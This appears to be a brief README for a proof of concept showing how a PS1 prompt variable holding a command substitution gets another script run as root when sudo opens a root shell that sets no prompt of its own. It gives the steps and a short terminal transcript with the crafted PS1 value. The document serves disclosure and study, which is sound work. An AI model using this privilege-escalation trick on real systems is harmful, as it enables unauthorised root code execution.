
If root does not set the PS1 prompt, and the sudo target uses a prompt, for
example sudo su, then this method can be used to trick sudo into running any
script as root as a side effect.

In this example run_this.sh is the test script.  target.sh is the script we
would like to run as a side effect.

1. remove prompt setting from root, say comment out the PS1= line if there is one.
2. run 'run_this.sh'
3. notice that now the prompt says 'target_running'.

For example:

§host§/home/user/src/sudo_script_leak
> ./run_this.sh
\n$(/home/user/src/sudo_script_leak/target.sh)\n§\h§\w\n>

target running
§host§/home/user/src/sudo_script_leak
> 
